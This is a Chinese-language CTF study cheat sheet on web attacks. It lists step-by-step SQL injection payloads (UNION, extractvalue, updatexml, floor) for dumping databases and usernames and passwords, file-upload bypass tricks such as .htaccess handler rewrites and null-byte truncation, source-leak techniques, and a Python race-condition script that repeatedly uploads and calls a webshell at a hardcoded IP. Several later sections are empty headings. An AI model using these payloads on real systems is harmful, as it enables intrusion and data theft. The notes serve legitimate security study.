# CTF技能树
### 信息泄露：
#### 目录遍历：
一种是服务器配置不当造成：由于web服务器对于用户输入的文件名称安全性验证不足所导致的一种安全漏洞，使得攻击者通过一些特殊字符可以绕过服务器的安全限制，访问任意文件。  

原理：程序在实现上没有充分过滤用户输入的../之类的目录跳转符  

一种是代码开发：1）加密参数传递数据，比如base64，url编码后传入
2）目录限定绕过：可以通过~来绕过，例如 ?filename=~/../boot，直接跳转到硬盘目录下
3）绕过文件后缀过滤：%00截断
#### phpinfo：
phpinfo是一个运行指令，为显示php服务器的配置信息  
1）php version(版本)，System（操作系统），Loaded Configuration File（配置文件路径）   
2）重要参数：allow_url_fopen(允许打开URL文件)，allow_url_include(允许引用url文件)---执行php伪协议，远程包含shell  
3）open_basedir:可以将访问限制在某个目录下  
#### 备份文件下载：
##### 网站源码
常见源码备份文件后缀：tar，tar.gz,zip,rar  
常见源码备份文件名：web,website,backup,back,www,wwwroot,temp(使用dirsearch扫描)
##### bak文件
将备份文件放在了web目录下，访问url/index.php.bak
##### vim缓存
使用vim编辑器会留下vim缓存，当vim异常退出，缓存会一直留在服务器上，引起源码泄露。以index.php为例，第一次产生缓存文件为.index.php.swp，第二次.index.php.swo，第三次.index.php.swn。还可能会生成index.php~
##### .DS_Store
是MAC OS保存文件夹的自定义属性的隐藏文件。访问url/.DS_Store下载文件，是linux文件，使用工具python-dsstore打开
#### git泄露：
原理：开发人员操作不当直接将git源码发到在线平台上。步骤：dirsearch扫描发现存在.git，githacker --url url --output-folder 文件夹名。然后使用git log命令查看git日志。再使用命令【git diff + 版本commit】查看信息改动，获得flag。或者git reset --hard +commit可以回退到之前版本

Stash：使用 git stash pop命令

#### SVN泄露：
发人员使用 SVN 进行版本控制时使用不当，SVN1.7及以后版本则只在项目根目录生成一个.svn文件夹，里面的pristine文件夹包含了整个项目的所有文件备份
方法：./rip-svn.pl -v -u url/.svn/   然后 cd .svn（或者tree .svn）
#### HG泄露：
 使用Mercurial 进行版本控制时处理不当，和SVN大同小异
方法： ./rip-hg-pl -v -u url/.hg/
grep -r flag* 用来匹配flag文件  
<br>
<br>
<br>

### 密码口令：
弱口令：
默认口令：
字典爆破：
### SQL注入：
用户在查询时通过拼接一些恶意的sql语句来欺骗服务器达到不应该达到的地方
基本操作：
连接数据库：mysql -uroot -ppassword
显示所有数据库：show databases；数据太多的话加/G分页显示
使用数据库:use databasename；
查看当前数据库名称:select database();
查看数据库表名称:show tables;
查询数据:select * from tablename;
查看表结构:desc tablename;
查看创建表语句:show create table users\G
!!不加引号表示字段名，加引号表示值,数字除外
information_schema数据库是mysql自带的信息数据库，用于存储数据库元数据(关于数据的数据)，例如数据库名，表名，列的数据类型，访问权限等。其中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。其中有两个重要的表  
tables 表：  
table_schema:数据库名字段  
table_name:表名称字段  
columns表：  
column_name:列名称字段  
table_schema:表名称字段  
最后还有非常重要的schema_name字段保存当前数据库服务器里面所有库名的信息
#### 整数型注入：
?id=1输入后会有回显，证明是整型注入，输入变量没有用单引号
注入步骤：  
1:查询字段数： `?id=1 union order by 3`  
2:判断回显位：`?id=-1 union select 1,2,3`  
3:查询当前数据库名：`?id=-1 union select 1,2,database()`  
4:查询所有数据库名:`?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata`  
5：查询数据库下的表名：`?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名'`  
6:查询表下的列名字段:`?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' `  
7:查询数据:`id=-1' union select 1,2,group_concat(username,password) from 表名`
#### 字符型注入：
注入步骤： 
1:查询字段数： `?id=1' union order by 3 #`  
2:判断回显位：`?id=-1' union select 1,2,3 #`  
3:查询当前数据库名：`?id=-1' union select 1,2,database() #`  
4:查询所有数据库名:`?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata #`  
5：查询数据库下的表名：`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名' #`  
6:查询表下的列名字段:`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' #`  
7:查询数据:`id=-1' union select 1,2,group_concat(username,password) from 表名 #` 
#### 报错注入：
mysql5.1.5 开始，提供两个 XML 查询和修改的函数：extractvalue 和 updatexml。extractvalue 负责在 xml 文档中按照 xpath 语法查询节点内容，updatexml 则负责修改查询到的内容。
用法上extractvalue与updatexml的区别：updatexml使用三个参数，extractvalue只有两个参数。还有一种就是floor实现的group by主键重复
extractvalue注入步骤(整数型)：  
1:查库名:`1 and (select extractvalue(1, concat(0x7e, (select database()))))`  
2:查表名:`1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= '库名'))))`  
3:查列名:`1 and (select extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name= '表名'))))`  
4:查数据:`1 and (select extractvalue(1, concat(0x7e, (select 字段名 from 表名))))`  

updatexml注入步骤(整数型):  
1:查库名:`1 and (select updatexml(1, (concat (0x7e, (select database()))),1))`  
2:查表名:`1 and (select updatexml(1, (concat (0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='库名'))),1)) `  
3:查列名:`1 and (select updatexml(1, (concat (0x7e, (select group_concat(column_name) from information_schema.columns where table_name='表名'))),1)) `  
4:查数据:`1 and (select updatexml(1, concat(0x7e, (select 字段名 from 表名)), 1))`  

floor注入步骤(仅参考):
`1 union select count(*), concat((select database()), floor(rand(0)*2)) x from news group by x`
`1 union select count(*), concat((select table_name from information_schema.tables where table_schema='库名' limit 1,1), floor(rand(0)*2)) x from news group by x`
`1 union select count(*), concat((select column_name from information_schema.columns where table_name='表名' limit 0,1), floor(rand(0)*2)) x from news group by x`
`1 union select count(*), concat((select 字段名 from 表名 limit 0,1), floor(rand(0)*2)) x from news group by x`
#### 布尔型注入：
#### 时间盲注：
mysql结构：
cookie注入：
UA注入：
refer注入：
空格注入：
update注入：
insert注入：
### 文件上传：
#### 前端JS验证：
1）火狐浏览器输入about config禁用javascript  2）F12开发者模式修改JS代码后上传  3）burp抓包修改
#### 服务端效验：
##### content-Type绕过：
bp抓包修改成image/jpeg  

##### 文件名绕过：
 Apache HTTP 服务器，可以尝试phtml,php3,php4,php5,pht等后缀名，但前提是配置文件中有 AddType application/x-httpd-php .php .phtml .phps .php5 .pht .htaccess

#### .htaccess绕过:Apache服务器
通过重写文件解析规则绕过，将.jpg文件当成php文件执行。内容诸如`<FilesMatch "shell.jpg">
SetHandler application/x-httpd-php
</FilesMatch>`注意先上传.htaccess再上传图片木马

#### 大小写绕过：
例如strtolower函数将所有字符转成小写，xx.pHp

#### 后缀加空格,点绕过：
例如传入的xx.php，在php后加一个空格或者一个.即可绕过。还可以.+空格+.绕过
#### Windows文件流特性绕过
文件名改成xx.php::$DATA,上传成功后保存xx.php
#### MIME绕过：
通过修改Content-Type的值来进行绕过
#### 00截断：
原理：0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕开检测。上传路径%00截断:save_path改成/upload/11.php%00，最后保存下来就是11.php
条件：php<5.3.29，且magic_quotes_gpc关闭
**POST**：%00在GET中被url解码后是空字符，但是在POST中%00不会被url解码。所以只能通过burpsuite修改hex值为00进行截断
#### 双写绕过：
文件名改成xx.phphpp，适用与检测到非法后缀就直接删除
#### 文件头部检查：
GIF89a  
图片马的制作！！  
常见题目：使用getimagesize获取文件类型，使用php_exif判断文件类型可以直接使用图片马
#### 条件竞争：
出现了先保存文件在判断然后删除的bug。
解题方法：通过不断上传一个木马文件，并不断访问，总能在其删除之前访问到它。一旦访问到，就会执行所在文件的php代码，生成另外一个木马文件通过蚁剑连接  
代码示列：
```python
import requests
import threading
import os

class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

        self.url = 'http://61.147.171.105:53486/upload/b.php'
        self.uploadUrl = 'http://61.147.171.105:53486/upload.php'

    def _get(self):
        print('try to call uploaded file...')

        r = requests.get(self.url)
        if r.status_code == 200:
            print('[*] create file heihei.php success.')
            os._exit(0)

    def _upload(self):
        print('upload file...')
        file = {'file': open('D:\\CTF\\b.php', 'r')}
        requests.post(self.uploadUrl, files=file)


    def run(self):
        while True:
            for i in range(5):
                self._get()

            for i in range(10):
                self._upload()
                self._get()

if __name__ == '__main__':
    threads = 5

    for i in range(threads):
        t = RaceCondition()
        t.start()

    for i in range(threads):
        t.join()

```
### XSS：
反射型：
存储型：
DOM型：
### SSRF：
内网访问：
伪协议读取文件：
端口扫描：
post请求：
上传文件：
fastCG协议：
redis协议：
### BY PASS：
url：
数字IP：
302跳转:
DNS重绑定：
### 远程命令执行RCE：
eval执行：
#### 文件包含
本地文件包含：
远程文件包含：
#### 命令注入：
过滤cat
过滤空格
目录分割分隔符
过滤运算符：
#### 为协议篇：
php
子主题2
